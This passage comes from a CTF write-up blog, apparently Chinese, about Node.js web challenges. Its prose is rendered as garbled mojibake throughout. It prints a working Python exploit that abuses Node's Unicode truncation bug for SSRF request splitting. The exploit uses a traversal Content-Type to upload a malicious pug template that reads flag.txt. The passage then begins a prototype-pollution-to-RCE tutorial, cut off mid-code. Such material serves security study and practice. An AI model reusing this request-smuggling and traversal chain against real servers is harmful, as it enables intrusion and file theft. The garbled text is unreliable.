class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">8081</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> host = server.<span class="title function_">address</span>().<span class="property">address</span></span><br><span class="line">    <span class="keyword">var</span> port = server.<span class="title function_">address</span>().<span class="property">port</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Example app listening at http://%s:%s&quot;</span>, host, port)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ”»å‡»æµç¨‹</p><blockquote><ol><li>å¯¹<code>/core</code>è·¯ç”±å‘èµ·åˆ‡åˆ†æ”»å‡», è¯·æ±‚<code>/core</code>çš„åŒæ—¶è¿˜å‘<code>/source</code>è·¯ç”±å‘å‡ºä¸Šä¼ æ–‡ä»¶çš„è¯·æ±‚</li><li>ç”±äº<code>/</code>è·¯ç”±æ˜¯å…ˆè¯»å–<code>/template</code>ç›®å½•ä¸‹çš„<code>pug</code>æ–‡ä»¶å†å°†å…¶æ¸²æŸ“åˆ°å½“å‰ç•Œé¢, å› æ­¤åº”è¯¥ä¸Šä¼ åŒ…å«å‘½ä»¤æ‰§è¡Œçš„<code>pug</code>æ–‡ä»¶, æ–‡ä»¶è™½ç„¶é»˜è®¤ä¸Šä¼ è‡³<code>/upload/</code>ç›®å½•ä¸‹, ä½†å¯ä»¥é€šè¿‡ç›®å½•ç©¿è¶Šå°†æ–‡ä»¶ä¸Šä¼ åˆ°<code>/template</code>ç›®å½•</li><li>è®¿é—®ä¸Šä¼ åˆ°<code>/template</code>ç›®å½•ä¸‹åŒ…å«å‘½ä»¤æ‰§è¡Œçš„<code>pug</code>æ–‡ä»¶</li></ol></blockquote><p>å¤§æ¦‚çœ‹ä¸€ä¸‹å‡ ä¸ªè·¯ç”±ï¼š</p><ul><li>/ï¼šä¼šåŒ…å«/templateç›®å½•ä¸‹çš„ä¸€ä¸ªpugæ¨¡æ¿æ–‡ä»¶å¹¶ç”¨pubæ¨¡æ¿å¼•æ“è¿›è¡Œæ¸²æŸ“</li><li>/sourceï¼šå›æ˜¾æºç </li><li>/file_uploadï¼šé™åˆ¶äº†åªèƒ½ç”±127.0.0.1çš„ipå°†æ–‡ä»¶ä¸Šä¼ åˆ°uploadsç›®å½•é‡Œé¢ï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œssrfã€‚å¹¶ä¸”æˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶mimetypeè¿›è¡Œç›®å½•ç©¿è¶Šï¼Œä»è€Œå°†æ–‡ä»¶ä¸Šä¼ åˆ°ä»»æ„ç›®å½•ã€‚</li><li>/coreï¼šé€šè¿‡qå‘å†…ç½‘çš„8081ç«¯å£ä¼ å‚ï¼Œç„¶åè·å–æ•°æ®å†è¿”å›å¤–ç½‘ï¼Œå¹¶ä¸”å¯¹urlè¿›è¡Œé»‘åå•çš„è¿‡æ»¤ï¼Œä½†æ˜¯è¿™é‡Œçš„é»‘åå•å¯ä»¥ç›´æ¥ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡ã€‚</li></ul><blockquote><p>nodejsåœ¨ç‰ˆæœ¬å·å°äº8.xçš„æ—¶å€™å­˜åœ¨unicodeå­—ç¬¦æŸåå¯¼è‡´çš„æ¼æ´ï¼Œè€Œè¿™ä¸ªé¢˜ç›®çš„ç‰ˆæœ¬åˆšå¥½å¯¹çš„ä¸Šï¼ˆä½†æ˜¯buuä¸Šçš„è¿™ä¸ªé¢˜å¹¶æ²¡æœ‰è¯´ç‰ˆæœ¬ï¼‰ï¼Œç®€å•æ¥è¯´å°±æ˜¯Unicodeåœ¨è§£æçš„æ—¶å€™ç”±äºè§£ç çš„ç±»å‹é—®é¢˜å¯¼è‡´éƒ¨åˆ†è¢«æˆªæ–­ï¼Œå­—ç¬¦å‡ºç°å˜å½¢ï¼Œè€ŒåŸå­—ç¬¦å¹¶éä¼šè¢«è½¬ä¹‰çš„å±é™©å­—ç¬¦é€ æˆçš„å®‰å…¨æ¼æ´ï¼Œå…·ä½“å°±æ˜¯å…ˆçŸ¥ç¤¾åŒºè¿™ç¯‡æ–‡ç« <br><a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2894#toc-2">https://xz.aliyun.com/t/2894#toc-2<i class="fas fa-external-link-alt"></i></a></p><p>æ‰€ä»¥æ„é€ ä¸€ä¸‹payloadï¼Œé€šè¿‡æ¢è¡Œç¬¦ä½¿å¾—æœåŠ¡å™¨åœ¨coreä¸­å‘å‡ºçš„ä¸€æ¬¡httpè¯·æ±‚å˜æˆä¸¤æ¬¡ï¼Œå¹¶ä¸”ç¬¬äºŒæ¬¡è¯·æ±‚å†…å®¹æˆ‘ä»¬å®Œå…¨å¯æ§<br>å¯ä»¥å…ˆå»uploadç›®å½•ä¸Šä¼ æ–‡ä»¶æŠ“ä¸€ä¸ªåŒ…ä½œä¸ºæ–‡ä»¶ä¸Šä¼ çš„æ¨¡æ¿ï¼Œæ„é€ ä¸€ä¸‹ï¼Œèµµæ€»å’Œå‡ºé¢˜äººæœ‰ä¸¤å¥—ä¸åŒçš„è„šæœ¬æ„é€ å­—ç¬¦ï¼Œä½†æ˜¯æ²¡æœ‰ä¸€ä¸ªäººè¯´æ˜è¿™äº›å­—ç¬¦æ˜¯æ€ä¹ˆæ„é€ å‡ºæ¥çš„ï¼Œå¹¶ä¸”ä¸¤ä¸ªè„šæœ¬ä¸äº’é€šï¼Œåˆ†åˆ«èƒ½ç”¨ï¼Œä½†æ˜¯å°è¯•ç”¨èµµæ€»çš„è„šæœ¬æ”¾ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„payloadæ—¶ç›´æ¥æŠŠbuuçš„ç¯å¢ƒæ‰“åˆ°äº†404ã€‚ã€‚ã€‚è¢«è¿«é‡æ–°å¼€ç¯å¢ƒ</p><p>å…³äºwafçš„ç»•è¿‡ï¼Œæƒ³è¿‡ç›´æ¥äºŒæ¬¡ç¼–ç ç»•è¿‡ï¼Œå› ä¸ºè¿™ç§ssrfå‘åˆ°æœåŠ¡å™¨ä¸€æ¬¡è§£ç ï¼ŒæœåŠ¡å™¨å†å‘é€åˆ°æœåŠ¡å™¨äºŒæ¬¡è§£ç ï¼Œè€Œæ£€æµ‹åªå‘ç”Ÿåœ¨ç¬¬ä¸€æ¬¡è§£ç æ—¶ï¼ŒäºŒæ¬¡ç¼–ç ç†è®ºä¸Šè¶…çº§ç»•è¿‡ï¼Œä½†æ˜¯è¿™é‡Œç¼–ç éœ€è¦æŠŠæ•´ä¸ªpayloadç¼–ç ä¸€éï¼Œå¯¼è‡´çš„ç»“æœå°±æ˜¯ç¬¬äºŒä¸ªhttpåŒ…çš„éƒ¨åˆ†å†…å®¹ä¹Ÿæ¥äº†ä¸ªäºŒæ¬¡ç¼–ç ï¼Œæ¯”å¦‚filenameé‚£é‡Œï¼Œåœ¨ç¬¬äºŒæ¬¡å‘åŒ…çš„æ—¶å€™å±äºheaderå†…å®¹ï¼ŒäºŒæ¬¡ç¼–ç ä½†è§£ç åªæœ‰ä¸€æ¬¡ï¼ˆè§£ç åªå¯¹postå’Œgetæäº¤çš„æ•°æ®è¿›è¡Œï¼‰ï¼Œä¼šå¯¼è‡´æ–‡ä»¶åæœ‰é—®é¢˜ï¼Œä½†æ˜¯é‚£é‡Œå¦‚æœåªç¼–ç ä¸€æ¬¡å°±ä¼šé€ æˆblacklisté‡Œé¢çš„å¼•å·é™åˆ¶è¿‡ä¸å»ï¼Œæ‰€ä»¥è¯´åˆ°åº•è¿˜æ˜¯éœ€è¦ç”¨æˆªæ–­å­—ç¬¦è¿™ç§ç¼–ç æ–¹å¼å»æ„é€ ä¸€ä¸ªå®Œå…¨æ— å…³çš„å­—ç¬¦è€Œæˆªæ–­åå´å®Œå…¨å¯åˆ©ç”¨çš„æ–¹å¼å»æ”»å‡»</p></blockquote><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:8081</span></span><br><span class="line"><span class="string">Content-Length: 266</span></span><br><span class="line"><span class="string">Cache-Control: max-age=0</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Origin: http://127.0.0.1:8081</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryG01qmiZ5h6Ap0QSc</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="string">Referer: http://127.0.0.1:8081/?action=upload</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">------WebKitFormBoundaryG01qmiZ5h6Ap0QSc</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.pug&quot;</span></span><br><span class="line"><span class="string">Content-Type: ../template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">doctype html</span></span><br><span class="line"><span class="string">html</span></span><br><span class="line"><span class="string">  head</span></span><br><span class="line"><span class="string">    style</span></span><br><span class="line"><span class="string">      include ../../../../../../../flag.txt</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryG01qmiZ5h6Ap0QSc--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET / HTTP/1.1</span></span><br><span class="line"><span class="string">test:&#x27;&#x27;&#x27;</span>.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload_encode</span>(<span class="params">raw</span>):</span><br><span class="line">    ret = <span class="string">u&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> raw:</span><br><span class="line">        ret += <span class="built_in">chr</span>(<span class="number">0x0100</span>+<span class="built_in">ord</span>(i))</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">payload = payload_encode(payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">&#x27;http://057e3adb-a0dd-4ef8-b06c-b64f535de269.node4.buuoj.cn:81/core?q=&#x27;</span> + urllib.parse.quote(payload))</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>è¿è¡Œ, ç„¶åè®¿é—®<code>http://057e3adb-a0dd-4ef8-b06c-b64f535de269.node4.buuoj.cn:81/?action=shell</code>å³å¯</p><h3 id="Node-jsåŸå‹é“¾æ±¡æŸ“"><a href="#Node-jsåŸå‹é“¾æ±¡æŸ“" class="headerlink" title="Node.jsåŸå‹é“¾æ±¡æŸ“"></a>Node.jsåŸå‹é“¾æ±¡æŸ“</h3><h4 id="prototypeå’Œ-proto"><a href="#prototypeå’Œ-proto" class="headerlink" title="prototypeå’Œ__proto__"></a><code>prototype</code>å’Œ<code>__proto__</code></h4><p>åœ¨JavaScriptä¸­, prototypeå¯¹è±¡æ˜¯å®ç°é¢å‘å¯¹è±¡çš„ä¸€ä¸ªé‡è¦æœºåˆ¶</p><p>å®ƒæ˜¯å‡½æ•°æ‰€ç‹¬æœ‰çš„, å®ƒæ˜¯ä»ä¸€ä¸ªå‡½æ•°æŒ‡å‘ä¸€ä¸ªå¯¹è±¡</p><p>å®ƒçš„å«ä¹‰æ˜¯å‡½æ•°çš„åŸå‹å¯¹è±¡, ä¹Ÿå°±æ˜¯æ„é€ å‡½æ•°æ‰€åˆ›å»ºçš„å®ä¾‹çš„åŸå‹å¯¹è±¡</p><p>å®ƒå°±ç›¸å½“äºæ˜¯ç±»çš„ä¸€ä¸ªå®ä¾‹çš„æ¨¡æ¿, åŸå‹çš„å¯¹è±¡. ç”Ÿæˆçš„å¯¹è±¡éƒ½ä¼šå‚ç…§è¿™ä¸ªåŸå‹å¯¹è±¡; ç”Ÿæˆå®ä¾‹åŒ–å¯¹è±¡æ—¶, å¦‚æœè‡ªå·±æ²¡æœ‰çš„å±æ€§prototypeæœ‰, å°±ä¼šç»§æ‰¿æ­¤å±æ€§, æœ‰çš„è¯åˆ™ä¸ä¼šè¦†ç›–</p><p>ä¾‹å¦‚ä¸‹é¢è¿™æ®µjsä»£ç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span> = <span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br><span class="line">foo.<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230518230629422.png" alt="image-20230518230629422"></p><p>å¯ä»¥çœ‹åˆ°, æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>prototype</code>å±æ€§, æŒ‡å‘åˆ°è¿™ä¸ªå‡½æ•°çš„åŸå‹å¯¹è±¡ä¸­ç„¶ååˆ›å»ºä¸€ä¸ªshow()å‡½æ•°, åŠŸèƒ½è¾“å‡ºä¸ºthis.bar</p><blockquote><p>æˆ‘ä»¬å¯ä»¥è®¤ä¸ºåŸå‹ prototypeæ˜¯ç±»Fooçš„ä¸€ä¸ªå±æ€§ï¼Œè€Œæ‰€æœ‰ç”¨Fooç±»å®ä¾‹åŒ–çš„å¯¹è±¡ï¼Œéƒ½å°†æ‹¥æœ‰è¿™ä¸ªå±æ€§ä¸­çš„æ‰€æœ‰å†…å®¹ï¼ŒåŒ…æ‹¬å˜é‡å’Œæ–¹æ³•ã€‚æ¯”å¦‚ä¸Šé¢ä¸­çš„fooå¯¹è±¡ï¼Œå…¶å¤©ç”Ÿå°±å…·æœ‰foo.show()æ–¹æ³•ã€‚</p></blockquote><p>å¦‚ä¸Šé¢æ‰€è¯´, æˆ‘ä»¬å¯ä»¥é€šè¿‡Foo.prototypeæ¥è®¿é—®Fooç±»çš„åŸå‹, ä½†Fooå®ä¾‹åŒ–å‡ºæ¥çš„å¯¹è±¡, æ˜¯ä¸èƒ½é€šè¿‡prototypeè®¿é—®åŸå‹çš„, è¿™æ—¶å€™å°±è¯¥<code>__proto__</code>ç™»åœºäº†</p><p>ä¸åŒäºprototypeæ˜¯å‡½æ•°ç‰¹æœ‰çš„, å®ƒæ˜¯å¯¹è±¡æ‰€ç‹¬æœ‰çš„, protoå±æ€§éƒ½æ˜¯ç”±ä¸€ä¸ªå¯¹è±¡æŒ‡å‘ä¸€ä¸ªå¯¹è±¡, å³æŒ‡å‘å®ƒä»¬çš„åŸå‹å¯¹è±¡(ä¹Ÿå¯ä»¥ç†è§£ä¸ºçˆ¶å¯¹è±¡)</p><blockquote><p>ä¸€ä¸ªFooç±»å®ä¾‹åŒ–å‡ºæ¥çš„Fooå¯¹è±¡, å¯ä»¥é€šè¿‡<code>foo.__proto__</code>å±æ€§æ¥è®¿é—®Fooç±»çš„åŸå‹, ä¹Ÿå°±æ˜¯è¯´: <code>foo.__proto__===Foo.prototype</code>(True)</p><p>å³: prototypeæ˜¯ä¸€ä¸ªç±»çš„å±æ€§, æ‰€æœ‰ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°†ä¼šæ‹¥æœ‰prototypeä¸­çš„å±æ€§å’Œæ–¹æ³•. ä¸€ä¸ªå¯¹è±¡çš„<code>__proto__</code>å±æ€§, æŒ‡å‘è¿™ä¸ªå¯¹è±¡æ‰€åœ¨ç±»çš„prototypeå±æ€§</p></blockquote><h4 id="åŸå‹é“¾ç»§æ‰¿æ€æƒ³"><a href="#åŸå‹é“¾ç»§æ‰¿æ€æƒ³" class="headerlink" title="åŸå‹é“¾ç»§æ‰¿æ€æƒ³"></a>åŸå‹é“¾ç»§æ‰¿æ€æƒ³</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">last_name</span> = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Father</span>()</span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(son.<span class="property">__proto__</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(son.<span class="property">__proto__</span>.<span class="property">__proto__</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(son.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">__proto__</span>)</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230519140542089.png" alt="image-20230519140542089"></p><p>Sonç±»ç»§æ‰¿äº†Fatherç±»çš„last_nameå±æ€§, æœ€åè¾“å‡ºçš„æ˜¯Name: Melania Trump</p><blockquote><p>æ€»ç»“: å¯¹äºå¯¹è±¡son, åœ¨console.log()è°ƒç”¨son.last_nameçš„æ—¶å€™, å®é™…ä¸ŠJavaScriptå¼•æ“ä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œ:</p><ol><li>åœ¨å¯¹è±¡sonä¸­å¯»æ‰¾last_name</li><li>å¦‚æœæ‰¾ä¸åˆ°, åˆ™åœ¨<code>son.__proto__</code>ä¸­å¯»æ‰¾last_name</li><li>å¦‚æœä»ç„¶æ‰¾ä¸åˆ°, åˆ™ç»§ç»­åœ¨<code>son.__proto__.__proto__</code>ä¸­å¯»æ‰¾last_name</li><li>ä¾æ¬¡å¯»æ‰¾, ç›´åˆ°æ‰¾åˆ°nullç»“æŸ, æ¯”å¦‚, Object.prototypeçš„<code>__proto__</code>å°±æ˜¯null</li></ol></blockquote><p>ç±»ä¼¼äºJavaé‡Œé¢ç»§æ‰¿çš„æ€æƒ³, å¦‚æœå­ç±»æ²¡æœ‰è¿™ä¸ªå±æ€§, å¾€ä¸Šç»§æ‰¿çˆ¶ç±», æœ‰çš„è¯å°±è‡ªå·±ç”¨è‡ªå·±çš„å¤šæ€</p><p>JavaScriptçš„è¿™ä¸ªæŸ¥æ‰¾æœºåˆ¶, è¢«è¿ç”¨åœ¨é¢å‘å¯¹è±¡çš„ç»§æ‰¿ä¸­, è¢«ç§°ä½œprototypeç»§æ‰¿é“¾</p><ol><li>æ¯ä¸ªæ„é€ å‡½æ•°(constructor)éƒ½æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡</li><li>å¯¹è±¡çš„<code>__proto__</code>å±æ€§, æŒ‡å‘ç±»çš„åŸå‹å¯¹è±¡prototype</li><li>JavaScriptä½¿ç”¨prototypeé“¾å®ç°ç»§æ‰¿æœºåˆ¶</li></ol><h4 id="åŸå‹é“¾å®šä¹‰åŠå¦‚ä½•æ±¡æŸ“"><a href="#åŸå‹é“¾å®šä¹‰åŠå¦‚ä½•æ±¡æŸ“" class="headerlink" title="åŸå‹é“¾å®šä¹‰åŠå¦‚ä½•æ±¡æŸ“"></a>åŸå‹é“¾å®šä¹‰åŠå¦‚ä½•æ±¡æŸ“</h4><p>åŸå‹é“¾çš„æ ¸å¿ƒå°±æ˜¯ä¾èµ–å¯¹è±¡<code>__proto__</code>çš„æŒ‡å‘, å½“è®¿é—®çš„å±æ€§åœ¨è¯¥å¯¹è±¡ä¸å­˜åœ¨æ—¶, å°±ä¼šå‘ä¸Šä»è¯¥å¯¹è±¡æ„é€ å‡½æ•°çš„prototypeè¿›è¡ŒæŸ¥æ‰¾, ç›´è‡³æŸ¥æ‰¾åˆ°objectçš„åŸå‹nullä¸ºæ­¢</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/Veur1v6GwiNs3bQ.png" alt="c0612f55a3c8bd31514ab2a1fafaf0be.png"></p><p>ç”±äºå¯¹è±¡ä¹‹å‰å­˜åœ¨ç»§æ‰¿å…³ç³», æ‰€ä»¥å½“æˆ‘ä»¬è¦ä½¿ç”¨æˆ–è€…è¾“å‡ºä¸€ä¸ªå˜é‡å°±ä¼šé€šè¿‡åŸå‹é“¾å‘ä¸Šæœç´¢, å½“ä¸Šå±‚æ²¡æœ‰å°±ä¼šå†å‘ä¸Šä¸Šå±‚æœç´¢, ç›´åˆ°æŒ‡å‘null, è‹¥æ­¤æ—¶è¿˜ä¸ºæ‰¾åˆ°å°±ä¼šè¿”å›underfined</p><p>å›¾ä¸­åŸå‹é“¾æ˜¯<code>cat-&gt;Cat.prototype-&gt;Object.prototype-&gt;null</code></p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/SL3NypUdR5MlDAo.png" alt="d280c12fd0ac041ae669f63076b8cec8.png"></p><p>åŸå‹é“¾æ±¡æŸ“å°±æ˜¯ä¿®æ”¹å…¶æ„é€ å‡½æ•°ä¸­çš„å±æ€§å€¼, ä½¿å…¶ä»–é€šè¿‡è¯¥æ„é€ å‡½æ•°å®ä¾‹åŒ–å‡ºçš„å¯¹è±¡ä¹Ÿå…·æœ‰è¿™ä¸ªå±æ€§çš„å€¼\</p><p>ç”±äºå¯¹è±¡æ˜¯æ— åºçš„, å½“ä½¿ç”¨ç¬¬äºŒç§æ–¹å¼è®¿é—®å¯¹è±¡æ—¶, åªèƒ½ä½¿ç”¨æŒ‡æ˜ä¸‹æ ‡çš„æ–¹å¼å»è®¿é—®</p><p>ä¸‹é¢æˆ‘ä»¬çœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//fooæ˜¯ä¸€ä¸ªç®€å•çš„JavaScriptå¯¹è±¡</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>:<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//foo.bar æ­¤æ—¶ä¸º1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¿®æ”¹fooçš„åŸå‹ (å³Object)</span></span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ç”±äºæŸ¥æ‰¾é¡ºåºçš„åŸå› , foo.barä»ç„¶æ˜¯1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">__proto__</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ­¤æ—¶å†ç”¨Objectåˆ›å»ºä¸€ä¸ªç©ºçš„zooå¯¹è±¡</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"><span class="comment">// æŸ¥çœ‹zoo.bar</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>)</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230519223604045.png" alt="image-20230519223604045"></p><p>é¦–å…ˆå»ºç«‹ä¸€ä¸ªfooå¯¹è±¡, æœ‰ä¸€ä¸ªbarå±æ€§ä¸º1, æ­¤æ—¶å®ƒçš„åŸå‹å¯¹è±¡å¹¶æ²¡æœ‰, åé¢é€šè¿‡<code>foo.__proto__</code>æŒ‡å‘å®ƒçš„åŸå‹å¯¹è±¡, ä¹Ÿå°±æ˜¯ç­‰ä»·äºæ˜¯<code>foo.prototype</code>, å³Object, ç»™ObjectåŸå‹å¯¹è±¡å¢åŠ äº†barå±æ€§, å€¼ä¸º2, ç°åœ¨Objectæœ‰äº†ä¸€ä¸ªbar=2çš„prototypeåŸå‹å¯¹è±¡, æ˜¯ç©ºçš„</p><p>ä½†æ˜¯åœ¨æˆ‘ä»¬è¾“å‡º<code>zoo.bar</code>çš„æ—¶å€™, Node.jsçš„å¼•æ“å°±å¼€å§‹åœ¨zooä¸­æŸ¥æ‰¾, å‘ç°æ²¡æœ‰, å»<code>zoo.__proto__</code>ä¸­æŸ¥æ‰¾, å³åœ¨Objectä¸­æŸ¥æ‰¾, è€Œæˆ‘ä»¬çš„<code>foo.prototype.bar=2</code>, å°±æ˜¯ç»™Objectæ·»åŠ äº†ä¸€ä¸ªbarå±æ€§, è€Œè¿™ä¸ªå±æ€§è¢«zooç»§æ‰¿</p><p>è¿™ç§ä¿®æ”¹äº†ä¸€ä¸ªæŸä¸ªå¯¹è±¡çš„åŸå‹å¯¹è±¡ï¼Œä»è€Œæ§åˆ¶åˆ«çš„å¯¹è±¡çš„æ“ä½œï¼Œå°±æ˜¯åŸå‹é“¾æ±¡æŸ“</p><h4 id="åŸå‹é“¾æ±¡æŸ“é…åˆRCE"><a href="#åŸå‹é“¾æ±¡æŸ“é…åˆRCE" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“é…åˆRCE"></a>åŸå‹é“¾æ±¡æŸ“é…åˆRCE</h4><p>æœ‰åŸå‹é“¾æ±¡æŸ“çš„å‰æä¸‹, æˆ‘ä»¬å¯ä»¥æ§åˆ¶åŸºç±»çš„æˆå‘˜, èµ‹å€¼ä¸ºä¸€ä¸²æ¶æ„ä»£ç , ä»è€Œå¯¼è‡´ä»£ç æ³¨å…¥</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 